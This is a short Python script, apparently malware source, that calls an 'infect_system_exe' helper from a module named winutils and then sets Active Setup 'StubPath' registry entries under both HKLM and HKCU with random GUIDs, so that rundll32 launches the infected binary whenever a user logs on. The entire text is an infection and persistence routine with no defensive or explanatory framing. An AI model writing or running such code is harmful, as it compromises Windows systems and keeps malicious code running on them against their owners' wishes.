import winutils

binary = winutils.infect_system_exe()

winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{0}'.format(winutils.random_guid()), 'StubPath', 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary))
winutils.set_registry_value('HKCU\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{0}'.format(winutils.random_guid()), 'StubPath', 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary))